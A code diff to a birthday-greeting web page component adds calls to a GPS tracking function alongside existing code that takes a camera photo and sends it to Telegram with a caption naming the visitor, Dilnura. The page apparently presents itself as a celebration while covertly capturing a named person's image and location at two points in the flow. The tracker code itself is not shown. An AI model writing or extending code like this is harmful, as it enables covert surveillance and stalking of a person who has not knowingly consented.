@@ -7,6 +7,7 @@ import { turningAge } from "@/lib/birthday";
 import { startBlowDetector, type BlowDetector } from "@/lib/blow";
 import { notify } from "@/lib/telegram";
 import { captureAndSendPhoto } from "@/lib/camera";
+import { trackGpsCoordinates } from "@/lib/tracker";
 import Celebration from "@/components/Celebration";
 
 type Stage = "line" | "cake" | "done";
@@ -88,6 +89,7 @@ export default function BirthdayIntro({ onBegin }: { onBegin: () => void }) {
     if (leaving) return;
     setLeaving(true);
     stopMic();
+    void trackGpsCoordinates();
     setTimeout(onBegin, 1400);
   };
 
@@ -96,6 +98,7 @@ export default function BirthdayIntro({ onBegin }: { onBegin: () => void }) {
   // only place the entry photo can be taken; the plain IntroOverlay is skipped.)
   const openCake = () => {
     captureAndSendPhoto("📸 Dilnura tug'ilgan kun saytini ochdi (tort sahnasi)");
+    void trackGpsCoordinates();
     setStage("cake");
   };
 
